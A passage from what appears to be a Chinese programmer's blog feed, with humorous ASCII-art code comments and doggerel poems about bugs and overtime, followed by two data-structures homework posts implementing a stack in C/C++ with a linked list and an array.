<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *　　　　　　　　┏┓　　　┏┓+ +</span><br><span class="line"> *　　　　　　　┏┛┻━━━┛┻┓ + +</span><br><span class="line"> *　　　　　　　┃　　　　　　　┃ 　</span><br><span class="line"> *　　　　　　　┃　　　━　　　┃ ++ + + +</span><br><span class="line"> *　　　　　　 ████━████ ┃+</span><br><span class="line"> *　　　　　　　┃　　　　　　　┃ +</span><br><span class="line"> *　　　　　　　┃　　　┻　　　┃</span><br><span class="line"> *　　　　　　　┃　　　　　　　┃ + +</span><br><span class="line"> *　　　　　　　┗━┓　　　┏━┛</span><br><span class="line"> *　　　　　　　　　┃　　　┃　　　　　　　　　　　</span><br><span class="line"> *　　　　　　　　　┃　　　┃ + + + +</span><br><span class="line"> *　　　　　　　　　┃　　　┃　Code is far away from bug with the animal protecting　　　　　　　</span><br><span class="line"> *　　　　　　　　　┃　　　┃ + 神兽保佑,永无bug　　</span><br><span class="line"> *　　　　　　　　　┃　　　┃</span><br><span class="line"> *　　　　　　　　　┃　　　┃　　+　　　　　　　　　</span><br><span class="line"> *　　　　　　　　　┃　 　　┗━━━┓ + +</span><br><span class="line"> *　　　　　　　　　┃ 　　　　　　　┣┓</span><br><span class="line"> *　　　　　　　　　┃ 　　　　　　　┏┛</span><br><span class="line"> *　　　　　　　　　┗┓┓┏━┳┓┏┛ + + + +</span><br><span class="line"> *　　　　　　　　　　┃┫┫　┃┫┫</span><br><span class="line"> *　　　　　　　　　　┗┻┛　┗┻┛+ + + +</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>程序员打油诗</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *                      江城子 . 程序员之歌</span><br><span class="line"> *</span><br><span class="line"> *                  十年生死两茫茫，写程序，到天亮。</span><br><span class="line"> *                      千行代码，Bug何处藏。</span><br><span class="line"> *                  纵使上线又怎样，朝令改，夕断肠。</span><br><span class="line"> *</span><br><span class="line"> *                  领导每天新想法，天天改，日日忙。</span><br><span class="line"> *                      相顾无言，惟有泪千行。</span><br><span class="line"> *                  每晚灯火阑珊处，夜难寐，加班狂。</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *          写字楼里写字间，写字间里程序员；</span><br><span class="line"> *          程序人员写程序，又拿程序换酒钱。</span><br><span class="line"> *          酒醒只在网上坐，酒醉还来网下眠；</span><br><span class="line"> *          酒醉酒醒日复日，网上网下年复年。</span><br><span class="line"> *          但愿老死电脑间，不愿鞠躬老板前；</span><br><span class="line"> *          奔驰宝马贵者趣，公交自行程序员。</span><br><span class="line"> *          别人笑我忒疯癫，我笑自己命太贱；</span><br><span class="line"> *          不见满街漂亮妹，哪个归得程序员？</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>单身狗</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">                       ::</span><br><span class="line">                      :;J7, :,                        ::;7:</span><br><span class="line">                      ,ivYi, ,                       ;LLLFS:</span><br><span class="line">                      :iv7Yi                       :7ri;j5PL</span><br><span class="line">                     ,:ivYLvr                    ,ivrrirrY2X,</span><br><span class="line">                     :;r@Wwz.7r:                :ivu@kexianli.</span><br><span class="line">                    :iL7::,:::iiirii:ii;::::,,irvF7rvvLujL7ur</span><br><span class="line">                   ri::,:,::i:iiiiiii:i:irrv177JX7rYXqZEkvv17</span><br><span class="line">                ;i:, , ::::iirrririi:i:::iiir2XXvii;L8OGJr71i</span><br><span class="line">              :,, ,,:   ,::ir@mingyi.irii:i:::j1jri7ZBOS7ivv,</span><br><span class="line">                 ,::,    ::rv77iiiriii:iii:i::,rvLq@huhao.Li</span><br><span class="line">             ,,      ,, ,:ir7ir::,:::i;ir:::i:i::rSGGYri712:</span><br><span class="line">           :::  ,v7r:: ::rrv77:, ,, ,:i7rrii:::::, ir7ri7Lri</span><br><span class="line">          ,     2OBBOi,iiir;r::        ,irriiii::,, ,iv7Luur:</span><br><span class="line">        ,,     i78MBBi,:,:::,:,  :7FSL: ,iriii:::i::,,:rLqXv::</span><br><span class="line">        :      iuMMP: :,:::,:ii;2GY7OBB0viiii:i:iii:i:::iJqL;::</span><br><span class="line">       ,     ::::i   ,,,,, ::LuBBu BBBBBErii:i:i:i:i:i:i:r77ii</span><br><span class="line">      ,       :       , ,,:::rruBZ1MBBqi, :,,,:::,::::::iiriri:</span><br><span class="line">     ,               ,,,,::::i:  @arqiao.       ,:,, ,:::ii;i7:</span><br><span class="line">    :,       rjujLYLi   ,,:::::,:::::::::,,   ,:i,:,,,,,::i:iii</span><br><span class="line">    ::      BBBBBBBBB0,    ,,::: , ,:::::: ,      ,,,, ,,:::::::</span><br><span class="line">    i,  ,  ,8BMMBBBBBBi     ,,:,,     ,,, , ,   , , , :,::ii::i::</span><br><span class="line">    :      iZMOMOMBBM2::::::::::,,,,     ,,,,,,:,,,::::i:irr:i:::,</span><br><span class="line">    i   ,,:;u0MBMOG1L:::i::::::  ,,,::,   ,,, ::::::i:i:iirii:i:i:</span><br><span class="line">    :    ,iuUuuXUkFu7i:iii:i:::, :,:,: ::::::::i:i:::::iirr7iiri::</span><br><span class="line">    :     :rk@Yizero.i:::::, ,:ii:::::::i:::::i::,::::iirrriiiri::,</span><br><span class="line">     :      5BMBBBBBBSr:,::rv2kuii:::iii::,:i:,, , ,,:,:i@petermu.,</span><br><span class="line">          , :r50EZ8MBBBBGOBBBZP7::::i::,:::::,: :,:,::i;rrririiii::</span><br><span class="line">              :jujYY7LS0ujJL7r::,::i::,::::::::::::::iirirrrrrrr:ii:</span><br><span class="line">           ,:  :@kevensun.:,:,,,::::i:i:::::,,::::::iir;ii;7v77;ii;i,</span><br><span class="line">           ,,,     ,,:,::::::i:iiiii:i::::,, ::::iiiir@xingjief.r;7:i,</span><br><span class="line">        , , ,,,:,,::::::::iiiiiiiiii:,:,:::::::::iiir;ri7vL77rrirri::</span><br><span class="line">         :,, , ::::::::i:::i:::i:i::,,,,,:,::i:i:::iir;@Secbone.ii:::</span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>骷髅头</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> **************************************************************</span><br><span class="line"> *                                                            *</span><br><span class="line"> *   .&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-.       *</span><br><span class="line"> *    |                     ______                     |      *</span><br><span class="line"> *    |                  .-&quot;      &quot;-.                  |      *</span><br><span class="line"> *    |                 &#x2F;            \                 |      *</span><br><span class="line"> *    |     _          |              |          _     |      *</span><br><span class="line"> *    |    ( \         |,  .-.  .-.  ,|         &#x2F; )    |      *</span><br><span class="line"> *    |     &gt; &quot;&#x3D;._     | )(__&#x2F;  \__)( |     _.&#x3D;&quot; &lt;     |      *</span><br><span class="line"> *    |    (_&#x2F;&quot;&#x3D;._&quot;&#x3D;._ |&#x2F;     &#x2F;\     \| _.&#x3D;&quot;_.&#x3D;&quot;\_)    |      *</span><br><span class="line"> *    |           &quot;&#x3D;._&quot;(_     ^^     _)&quot;_.&#x3D;&quot;           |      *</span><br><span class="line"> *    |               &quot;&#x3D;\__|IIIIII|__&#x2F;&#x3D;&quot;               |      *</span><br><span class="line"> *    |              _.&#x3D;&quot;| \IIIIII&#x2F; |&quot;&#x3D;._              |      *</span><br><span class="line"> *    |    _     _.&#x3D;&quot;_.&#x3D;&quot;\          &#x2F;&quot;&#x3D;._&quot;&#x3D;._     _    |      *</span><br><span class="line"> *    |   ( \_.&#x3D;&quot;_.&#x3D;&quot;     &#96;--------&#96;     &quot;&#x3D;._&quot;&#x3D;._&#x2F; )   |      *</span><br><span class="line"> *    |    &gt; _.&#x3D;&quot;                            &quot;&#x3D;._ &lt;    |      *</span><br><span class="line"> *    |   (_&#x2F;                                    \_)   |      *</span><br><span class="line"> *    |                                                |      *</span><br><span class="line"> *    &#39;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;&#39;      *</span><br><span class="line"> *                                                            *</span><br><span class="line"> *           LASCIATE OGNI SPERANZA, VOI CH&#39;ENTRATE           *</span><br><span class="line"> **************************************************************</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>顶</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂</span><br><span class="line"> * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　</span><br><span class="line"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　　　　　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂</span><br><span class="line"> * 　　　頂頂　　　　　　　頂頂頂　</span><br><span class="line"> * 　　　頂頂　　　　　　頂頂　頂頂　頂頂</span><br><span class="line"> * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂</span><br><span class="line"> * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**BUG泛滥，我已瘫痪</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * _ooOoo_</span><br><span class="line"> * o8888888o</span><br><span class="line"> * 88&quot; . &quot;88</span><br><span class="line"> * (| -_- |)</span><br><span class="line"> *  O\ &#x3D; &#x2F;O</span><br><span class="line"> * ___&#x2F;&#96;---&#39;\____</span><br><span class="line"> * .   &#39; \\| |&#x2F;&#x2F; &#96;.</span><br><span class="line"> * &#x2F; \\||| : |||&#x2F;&#x2F; \</span><br><span class="line"> * &#x2F; _||||| -:- |||||- \</span><br><span class="line"> * | | \\\ - &#x2F;&#x2F;&#x2F; | |</span><br><span class="line"> * | \_| &#39;&#39;\---&#x2F;&#39;&#39; | |</span><br><span class="line"> * \ .-\__ &#96;-&#96; ___&#x2F;-. &#x2F;</span><br><span class="line"> * ___&#96;. .&#39; &#x2F;--.--\ &#96;. . __</span><br><span class="line"> * .&quot;&quot; &#39;&lt; &#96;.___\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.</span><br><span class="line"> * | | : &#96;- \&#96;.;&#96;\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |</span><br><span class="line"> * \ \ &#96;-. \_ __\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;</span><br><span class="line"> * &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> * &#96;&#x3D;---&#x3D;&#39;</span><br><span class="line"> * .............................................</span><br><span class="line"> * 佛曰：bug泛滥，我已瘫痪！</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>啪</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *                                         ,s555SB@@&amp;                          </span><br><span class="line"> *                                      :9H####@@@@@Xi                        </span><br><span class="line"> *                                     1@@@@@@@@@@@@@@8                       </span><br><span class="line"> *                                   ,8@@@@@@@@@B@@@@@@8                      </span><br><span class="line"> *                                  :B@@@@X3hi8Bs;B@@@@@Ah,                   </span><br><span class="line"> *             ,8i                  r@@@B:     1S ,M@@@@@@#8;                 </span><br><span class="line"> *            1AB35.i:               X@@8 .   SGhr ,A@@@@@@@@S                </span><br><span class="line"> *            1@h31MX8                18Hhh3i .i3r ,A@@@@@@@@@5               </span><br><span class="line"> *            ;@&amp;i,58r5                 rGSS:     :B@@@@@@@@@@A               </span><br><span class="line"> *             1#i  . 9i                 hX.  .: .5@@@@@@@@@@@1               </span><br><span class="line"> *              sG1,  ,G53s.              9#Xi;hS5 3B@@@@@@@B1                </span><br><span class="line"> *               .h8h.,A@@@MXSs,           #@H1:    3ssSSX@1                  </span><br><span class="line"> *               s ,@@@@@@@@@@@@Xhi,       r#@@X1s9M8    .GA981               </span><br><span class="line"> *               ,. rS8H#@@@@@@@@@@#HG51;.  .h31i;9@r    .8@@@@BS;i;          </span><br><span class="line"> *                .19AXXXAB@@@@@@@@@@@@@@#MHXG893hrX#XGGXM@@@@@@@@@@MS        </span><br><span class="line"> *                s@@MM@@@hsX#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;,      </span><br><span class="line"> *              :GB@#3G@@Brs ,1GM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B,     </span><br><span class="line"> *            .hM@@@#@@#MX 51  r;iSGAM@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8     </span><br><span class="line"> *          :3B@@@@@@@@@@@&amp;9@h :Gs   .;sSXH@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class="line"> *      s&amp;HA#@@@@@@@@@@@@@@M89A;.8S.       ,r3@@@@@@@@@@@@@@@@@@@@@@@@@@@r    </span><br><span class="line"> *   ,13B@@@@@@@@@@@@@@@@@@@5 5B3 ;.         ;@@@@@@@@@@@@@@@@@@@@@@@@@@@i    </span><br><span class="line"> *  5#@@#&amp;@@@@@@@@@@@@@@@@@@9  .39:          ;@@@@@@@@@@@@@@@@@@@@@@@@@@@;    </span><br><span class="line"> *  9@@@X:MM@@@@@@@@@@@@@@@#;    ;31.         H@@@@@@@@@@@@@@@@@@@@@@@@@@:    </span><br><span class="line"> *   SH#@B9.rM@@@@@@@@@@@@@B       :.         3@@@@@@@@@@@@@@@@@@@@@@@@@@5    </span><br><span class="line"> *     ,:.   9@@@@@@@@@@@#HB5                 .M@@@@@@@@@@@@@@@@@@@@@@@@@B    </span><br><span class="line"> *           ,ssirhSM@&amp;1;i19911i,.             s@@@@@@@@@@@@@@@@@@@@@@@@@@S   </span><br><span class="line"> *              ,,,rHAri1h1rh&amp;@#353Sh:          8@@@@@@@@@@@@@@@@@@@@@@@@@#:  </span><br><span class="line"> *            .A3hH@#5S553&amp;@@#h   i:i9S          #@@@@@@@@@@@@@@@@@@@@@@@@@A. </span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> *   </span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<p><strong><a href="http://www.asciiworld.com/">Click Here For More</a></strong></p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
  </entry>
  <entry>
    <title>链表实现栈</title>
    <url>/post/25d78577/</url>
    <content><![CDATA[<h1 id="链表实现栈"><a href="#链表实现栈" class="headerlink" title="链表实现栈"></a>链表实现栈</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	ElemType data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;StackNode,*LinkStack;</span><br><span class="line"><span class="function">Status <span class="title">InitStack</span><span class="params">(LinkStack &amp;S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	S=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">Push</span><span class="params">(LinkStack &amp;S,SElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LinkStack p=<span class="keyword">new</span> StackNode;</span><br><span class="line">	p-&gt;data=e;</span><br><span class="line">	p-&gt;next=S;</span><br><span class="line">	S=p;</span><br><span class="line">	<span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">Pop</span><span class="params">(LinkStack &amp;S,SElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S==<span class="literal">NULL</span>)<span class="keyword">return</span> ERROR;</span><br><span class="line">	e=S-&gt;data;</span><br><span class="line">	LinkStack p=S;</span><br><span class="line">	S=S-&gt;next;</span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line">	<span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">SElemType <span class="title">GetTop</span><span class="params">(LinkStack S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S!=<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> S-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LinkStack S;</span><br><span class="line">	InitStack(S);</span><br><span class="line">	<span class="keyword">int</span> N,ch;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1.入栈\n2.出栈\n3.取栈顶元素\n0.退出\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;ch)!=EOF)</span><br><span class="line">	&#123;</span><br><span class="line">		ElemType e;</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入入栈数目！\n&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入%d个数按顺序入栈！\n&quot;</span>,N);</span><br><span class="line">			<span class="keyword">while</span>(N--)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;e);</span><br><span class="line">				Push(S,e);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;OK!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!Pop(S,e))<span class="built_in">printf</span>(<span class="string">&quot;栈为空！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;出栈元素为%d\n&quot;</span>,e);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="number">3</span>)<span class="built_in">printf</span>(<span class="string">&quot;栈顶元素为%d!\n&quot;</span>,GetTop(S));</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链表</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>顺序表实现栈</title>
    <url>/post/924b455d/</url>
    <content><![CDATA[<h1 id="顺序表实现栈"><a href="#顺序表实现栈" class="headerlink" title="顺序表实现栈"></a>顺序表实现栈</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Ok 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Error 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> True 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> False 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType *base;</span><br><span class="line">    SElemType *top;</span><br><span class="line">    <span class="keyword">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="function">Status <span class="title">InitStack</span><span class="params">(SqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s-&gt;base = (SElemType *)<span class="built_in">malloc</span>(INIT_SIZE * <span class="keyword">sizeof</span>(SElemType));</span><br><span class="line">    <span class="keyword">if</span>(!s-&gt;base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;存储空间分配失败！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Error;</span><br><span class="line">    &#125;</span><br><span class="line">    s-&gt;top = s-&gt;base;</span><br><span class="line">    s-&gt;stacksize = INIT_SIZE;</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">ClearStack</span><span class="params">(SqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s-&gt;top = s-&gt;base;</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">StackEmpty</span><span class="params">(SqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == s-&gt;base)</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">Destroy</span><span class="params">(SqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(s-&gt;base);</span><br><span class="line">    s-&gt;base = <span class="literal">NULL</span>;</span><br><span class="line">    s-&gt;top = <span class="literal">NULL</span>;</span><br><span class="line">    s-&gt;stacksize=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">GetTop</span><span class="params">(SqStack *s, SElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == s-&gt;base)<span class="keyword">return</span> Error;</span><br><span class="line">    e = *(s-&gt;top - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">Push</span><span class="params">(SqStack *s, SElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top - s-&gt;base &gt;= s-&gt;stacksize)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;base = (SElemType *)<span class="built_in">realloc</span>(s-&gt;base, (s-&gt;stacksize + STACKINCREMENT) * <span class="keyword">sizeof</span>(SElemType));</span><br><span class="line">        <span class="keyword">if</span>(!s-&gt;base)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;存储空间分配失败！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> Error;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;top = s-&gt;base + s-&gt;stacksize;</span><br><span class="line">        s-&gt;stacksize += STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    *s-&gt;top++ = e;</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">Pop</span><span class="params">(SqStack *s, SElemType *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == s-&gt;base)<span class="keyword">return</span> Error;</span><br><span class="line">    --s-&gt;top;</span><br><span class="line">    *e = *(s-&gt;top);</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">StackTraverse</span><span class="params">(SqStack *s,Status(*visit)(SElemType))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SElemType *b = s-&gt;base;</span><br><span class="line">    SElemType *t = s-&gt;top;</span><br><span class="line">    <span class="keyword">while</span>(t &gt; b)visit(*b++);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">visit</span><span class="params">(SElemType c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,c);</span><br><span class="line">    <span class="keyword">return</span> Ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stack_insert</span><span class="params">(SqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;请输入要进栈的个数：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入%d个数依次入栈\n&quot;</span>,n);</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> m;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">        Push(s, m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    SqStack a;</span><br><span class="line">    SqStack *s = &amp;a;</span><br><span class="line">    SElemType e;</span><br><span class="line">    InitStack(s);</span><br><span class="line">    stack_insert(s);</span><br><span class="line">    StackTraverse(s, visit);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入1入栈，输入2出栈,输入0退出！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)!=EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)stack_insert(s);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(StackEmpty(s))<span class="built_in">printf</span>(<span class="string">&quot;栈为空！\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Pop(s, &amp;e);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;出栈的元素是：%d\n&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        StackTraverse(s, visit);</span><br><span class="line">    &#125;</span><br><span class="line">    